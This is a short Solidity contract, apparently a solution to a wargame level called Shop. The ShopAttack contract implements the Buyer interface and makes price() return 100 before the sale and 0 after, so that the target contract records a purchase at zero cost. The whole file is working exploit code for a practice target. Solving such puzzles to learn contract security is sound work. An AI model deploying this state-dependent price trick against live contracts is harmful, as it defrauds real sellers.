// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Buyer, Shop} from "./21-Shop.sol";

contract ShopAttack is Buyer {

    Shop public shop;

    constructor (address _shop) {
        shop = Shop(_shop);
    }

    function attack() external {
        shop.buy();
    }

    function price() override external view returns(uint) {
        return shop.isSold() ? 0 : 100;
    }
}